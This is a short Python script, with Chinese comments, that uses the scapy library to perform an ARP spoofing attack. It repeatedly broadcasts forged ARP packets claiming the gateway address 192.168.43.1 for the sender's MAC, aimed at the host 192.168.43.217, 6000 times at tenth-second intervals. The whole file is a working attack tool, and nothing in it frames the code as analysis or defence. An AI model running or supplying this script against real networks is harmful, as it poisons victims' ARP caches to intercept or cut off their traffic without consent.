from scapy.all import *
import time
#构造包
#pdst是目标IP，psrc是网关的ip
p1=Ether(dst="ff:ff:ff:ff:ff:ff",src="14:4f:8a:69:0e:a6")/ARP(pdst="192.168.43.217",psrc="192.168.43.1")
# p1=Ether(dst="ff:ff:ff:ff:ff:ff",src="14:4f:8a:69:0e:a6")/ARP(psrc="192.168.43.1",pdst="192.168.43.217")
for i in range(6000):
    sendp(p1)
    time.sleep(0.1)